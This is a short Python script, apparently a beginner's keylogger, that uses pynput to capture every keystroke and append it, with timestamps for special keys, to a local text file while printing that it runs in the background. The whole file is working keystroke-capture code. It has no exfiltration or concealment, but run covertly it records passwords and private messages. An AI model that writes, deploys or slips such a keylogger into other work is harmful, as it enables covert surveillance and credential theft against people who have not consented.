
from pynput.keyboard import Listener, Key #listens keys
import datetime #timestamping

#file where keys are supposed to be saved
Logged_File = "keylogger.txt"

def log_key(key):#function for key specification and data collection
    try:
        # timestamping
        time = datetime.datetime.now().strftime("%d:%m:%Y %H:%M:%S") 
        # writing into the file
        with open(Logged_File, "a") as file:
            #characters
            if hasattr(key, 'char'):  
                file.write(key.char)
            #space
            elif key == key.space:
                file.write(" ")
            #backspace
            elif key == key.backspace:
                file.write(f"[backspace] , {time}\n")
            #shift
            elif key == key.shift:
                file.write(f"[shift] , {time}\n")
            #ctrl
            elif key == key.ctrl:
                file.write(f"[ctrl] , {time}\n")
            #tab
            elif key == key.tab:
                file.write(f"[tab] , {time}\n")
            #capslock
            elif key == key.caps_lock:  
                file.write(f"[caps lock] , {time}\n")
            #enter
            elif key == key.enter:
                file.write(f"[enter] , {time}\n")
            #unknown keys
            else:
                file.write(f"[{key}] , {time}\n")  
    #error            
    except AttributeError:
        print(f"key not found")
#saving key when pressed
def on_press(key):#function called
    log_key(key)

with Listener(on_press=on_press) as listener: #listens pressed key 
    print(f"Keylogger is running in the background. Logs saved to {Logged_File}.")
    listener.join()



            
            
            
